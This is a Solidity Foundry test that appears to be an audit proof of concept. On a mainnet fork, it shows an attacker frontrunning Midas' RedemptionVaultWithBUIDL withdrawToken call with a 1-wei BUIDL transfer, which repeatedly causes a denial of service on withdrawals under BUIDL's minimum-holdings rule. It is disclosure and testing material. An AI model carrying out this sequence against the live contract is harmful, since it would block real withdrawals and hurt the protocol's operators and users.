// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Libraries
import {Test, console} from "forge-std/Test.sol";

// Contracts
import {RedemptionVaultWIthBUIDL} from "../src/RedemptionVaultWithBUIDL.sol";
import {MidasAccessControl} from "../src/access/MidasAccessControl.sol";

interface IBUIDL {
    function getDSService(uint256 _serviceId) external view returns (address);

    function transfer(address to, uint256 amount) external;

    function balanceOf(address user) external view returns (uint256);
}

interface IDSComplianceConfigurationService {
    function contractOwner() external view returns (address);
    function getMinimumHoldingsPerInvestor() external view returns (uint256);
    function setMinimumHoldingsPerInvestor(uint256 _value) external;
    function setForceAccredited(bool _value) external;
}

interface IDSRegistryService {
    function registerInvestor(
        string memory _id,
        string memory _collision_hash
    ) external returns (bool);
    function addWallet(
        address _address,
        string memory _id
    ) external returns (bool);
    function getInvestor(
        address _address
    ) external view returns (string memory);
    function contractOwner() external view returns (address);
}

/// @notice Proof of concept contract
/// @dev Upgradability is skipped for simplicity.
/// @dev A `setAccessControl` has been added to `WithMidasAccessControl` for simplicity.
contract PocTest is Test {
    ////////////////////////////////////////////////////////////////
    //                         CONSTANTS                          //
    ////////////////////////////////////////////////////////////////

    IBUIDL public constant BUIDL =
        IBUIDL(0x7712c34205737192402172409a8F7ccef8aA2AEc);

    /// @notice Extracted from `IDSServiceConsumer.sol` line 22, check at https://etherscan.io/address/0x603bb6909be14f83282e03632280d91be7fb83b2#code#F25#L22
    uint256 public constant COMPLIANCE_CONFIGURATION_SERVICE_ID = 256;
    /// @notice Extracted from `IDSServiceConsumer.sol` line 16, check at https://etherscan.io/address/0x603bb6909be14f83282e03632280d91be7fb83b2#code#F25#L16
    uint256 public constant REGISTRY_SERVICE_ID = 4;

    ////////////////////////////////////////////////////////////////
    //                         STORAGE                            //
    ////////////////////////////////////////////////////////////////
    /// @notice This contract allows to set some configurations in BUIDL. It is useful to mock the minimum holdings state.
    IDSComplianceConfigurationService public COMPLIANCE_CONFIGURATION_SERVICE;
    /// @notice The registry service allows us to whitelist the redeem vault as a BUIDL holder.
    IDSRegistryService public REGISTRY_SERVICE;
    
    /// @notice Owner of `COMPLIANCE_CONFIGURATION_SERVICE`. Required as the caller to set certain configurations.
    address public complianceConfigurationServiceOwner;

    MidasAccessControl public midasAccessControl;
    RedemptionVaultWIthBUIDL public redemptionVaultWithBUIDL;

    // @notice Holder obtained from https://etherscan.io/token/0x7712c34205737192402172409a8f7ccef8aa2aec#balances. This address will act as three distinct roles through the PoC:
    // - Initially, it will act as a faucet so that the redemption vault's initial BUIDL balance can be set
    // - Secondly, it will act as the attacker, frontrunning the `withdrawToken` transaction
    // - Finally, it will act as the receiver for the `withdrawToken` function. This is done to avoid having to configure yet another address as a BUIDL holder. In reality, this would be a Midas' whitelisted address.
    address public constant BUIDL_HOLDER =
        0xEd71aa0dA4fdBA512FfA398fcFf9db8C49A5Cf72;

    ////////////////////////////////////////////////////////////////
    //                         SETUP                              //
    ////////////////////////////////////////////////////////////////

    function setUp() public {
        // Fork Mainnet
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
        vm.rollFork(20687807); // Specific block where it is certain that `BUIDL_HOLDER` will correctly act as a source of BUIDL liquidity

        // Fetch Compliance Configuration Service contract (this contract controls global configurations)
        COMPLIANCE_CONFIGURATION_SERVICE = IDSComplianceConfigurationService(
            BUIDL.getDSService(COMPLIANCE_CONFIGURATION_SERVICE_ID)
        );

        REGISTRY_SERVICE = IDSRegistryService(
            BUIDL.getDSService(REGISTRY_SERVICE_ID)
        );

        // Fetch Compliance Configuration Service owner to update BUIDL configurations. This is the address allowed to update BUIDL's configurations.
        complianceConfigurationServiceOwner = COMPLIANCE_CONFIGURATION_SERVICE
            .contractOwner();

        // Deploy Midas protocol
        _deployMidas();

        // Add the Redeem vault as an investor so that it can hold BUIDL
        vm.startPrank(REGISTRY_SERVICE.contractOwner());
        require(
            REGISTRY_SERVICE.registerInvestor(
                "redeem_vault_id",
                "collision_hash"
            )
        );
        require(
            REGISTRY_SERVICE.addWallet(
                address(redemptionVaultWithBUIDL),
                "redeem_vault_id"
            )
        );

        // Remove the need to be accredited. This aims at making the PoC easier, as the Compliance Configuration Service contract is not verified, so its code is not publicly available. Because we would need the logic
        // to make the `redemptionVaultWithBUIDL` be accredited (but actually don't have access to such logic), it is easier to set the force accredited flag to `false`.
        COMPLIANCE_CONFIGURATION_SERVICE.setForceAccredited(false);

        // Deal BUIDL to the redemption vault so that withdrawals can be triggered. `BUIDL_HOLDER` is used as the faucet.
        vm.startPrank(BUIDL_HOLDER);
        BUIDL.transfer(address(redemptionVaultWithBUIDL), 100e6);

        vm.stopPrank();
    }

    ////////////////////////////////////////////////////////////////
    //                    PROOF OF CONCEPT                        //
    ////////////////////////////////////////////////////////////////
    function testPoc() public {
        // Step 1: Compliance Configuration Service enables a minimum of 50 token holdings per investor
        vm.startPrank(complianceConfigurationServiceOwner);
        COMPLIANCE_CONFIGURATION_SERVICE.setMinimumHoldingsPerInvestor(50e6);

        vm.stopPrank();

        // Step 2: Midas' Redemption Vault owner wants to withdraw all their BUIDL tokens for safety. The approach is to query the current contract balance, and then trigger
        // the `withdrawToken` transaction.
        uint256 withdrawAmount = BUIDL.balanceOf(
            address(redemptionVaultWithBUIDL)
        );
        assertEq(withdrawAmount, 100e6); // Make sure withdraw amount is equal to the initial balance

        // Step 3: At this point, Midas' admin has triggered `withdrawToken`, however the attacker frontruns the transaction, and transfers 1 wei to the vault.
        vm.prank(BUIDL_HOLDER); // Note that `BUIDL_HOLDER` is now the attacker, not the faucet.
        BUIDL.transfer(address(redemptionVaultWithBUIDL), 1);

        // Because of the transfer, the total balance of the vault has increased. However, the amount to withdraw has not
        // changed due to being frontrunned
        assertEq(BUIDL.balanceOf(address(redemptionVaultWithBUIDL)), 100e6 + 1);

        // Step 4: Finally, the `withdrawToken` transaction gets executed, and fails due to leaving the redeem vault contract with a balance different from zero,
        // and smaller that the minimun holdings per investor configured in the BUIDL token.
        vm.expectRevert("Amount of tokens under min");
        redemptionVaultWithBUIDL.withdrawToken(
            address(BUIDL),
            withdrawAmount,
            BUIDL_HOLDER // At this point, the `BUIDL_HOLDER` acts as the third role: receiver of the `withdrawToken` call (for simplicity). In reality, this would be a Midas account.
        );

        // At this point, the DoS has taken place. The sequence can always be repeated by the attacker, effectively DoSing withdrawals.
    }

    ////////////////////////////////////////////////////////////////
    //                    INTERNAL HELPERS                        //
    ////////////////////////////////////////////////////////////////

    /// @notice Deploys the `MidasAccessControl` and `RedemptionVaultWIthBUIDL` contracts, needed for the PoC.
    function _deployMidas() internal {
        // Deploy access control contract.
        midasAccessControl = new MidasAccessControl();

        // Initialize access control. This gives the PoC contract `REDEMPTION_VAULT_ADMIN_ROLE` (among others). This way, it can trigger RedemptionVaultWIthBUIDL's `withdrawToken`
        // function to mimic recovering the BUIDL tokens.
        midasAccessControl.initialize();

        // Deploy `RedemptionVaultWIthBUIDL`. We only want to demonstrate the actual issue when withdrawing tokens, so we will

        redemptionVaultWithBUIDL = new RedemptionVaultWIthBUIDL();

        // Set the access control contract in the redemption vault
        redemptionVaultWithBUIDL.setAccessControl(address(midasAccessControl));
    }
}
